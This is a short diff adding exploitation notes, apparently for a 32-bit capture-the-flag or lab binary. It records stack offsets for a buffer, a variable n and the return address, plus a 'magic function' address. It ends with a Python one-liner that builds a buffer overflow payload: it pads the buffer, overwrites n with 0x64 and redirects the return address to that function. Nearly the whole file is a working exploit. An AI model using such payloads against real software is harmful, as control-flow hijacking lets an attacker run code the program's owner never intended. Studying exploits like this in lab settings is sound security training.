@@ -1,0 +1,6 @@
+0x080491c6 - adresa magic function
+ebp-0x18 - n
+ebp-0x58 - buffer
+ebp+0x04 - ret address
+
+python -c "print('200\n' + 0x40*'A' + '\x00\x00\x00\x64 '[::-1] + 0x1c*'A' + '\x08\x04\x91\xc6'[::-1])"
